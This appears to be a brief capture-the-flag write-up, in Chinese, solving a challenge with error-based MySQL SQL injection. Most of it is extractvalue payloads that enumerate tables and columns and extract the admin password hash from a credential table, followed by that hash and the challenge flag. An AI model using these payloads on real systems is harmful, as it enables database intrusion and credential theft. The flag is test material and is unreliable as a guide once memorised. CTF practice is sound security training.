```
数据库名：
'or(select+extractvalue(1,concat(0x7e,(select+database()))))#

表名：
'and(select+extractvalue(1,concat(0x7e,(select+group_concat(table_name)/**/from/**/information_schema.tables/**/where+table_schema=database()))))#

字段名：
'and(select+extractvalue(1,concat(0x7e,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name="credential"))))#
'and(select+extractvalue(1,concat(0x7e,(select/**/reverse(group_concat(column_name))/**/from/**/information_schema.columns/**/where/**/table_name="credential"))))#

数据：
'and(select+extractvalue(1,concat(0x7e,(select/**/group_concat(password)/**/from/**/credential/**/where/**/name='admin'))))#
'and(select+extractvalue(1,concat(0x7e,(select/**/reverse(group_concat(password))/**/from/**/credential/**/where/**/name='admin'))))#
拼接即可

name: admin
pass: a5bdf35a1df4ea895905f6f6618e83951a6effc0

admin登录即可

actf{err0r_bas3d_sq1i_ha99y_1ew_year!}
```

